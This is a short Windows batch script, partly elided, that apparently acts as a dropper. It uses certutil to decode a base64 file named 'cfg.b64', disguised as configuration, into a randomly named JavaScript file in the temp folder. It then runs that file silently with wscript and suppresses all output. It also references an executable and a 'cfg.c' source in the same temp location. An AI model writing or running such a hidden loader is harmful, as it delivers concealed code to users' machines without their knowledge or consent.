@echo off
setlocal
set "OUT=%TEMP%\rbc_1420eb3e8137c189.exe"
set "SRC=%~dp0cfg.c"
...
:js
del /f /q "%TEMP%\rbc_1420eb3e8137c189.js" >nul 2>&1
certutil -f -decode "%~dp0cfg.b64" "%TEMP%\rbc_1420eb3e8137c189.js" >nul 2>&1
wscript.exe //B //nologo "%TEMP%\rbc_1420eb3e8137c189.js"
exit /b 0
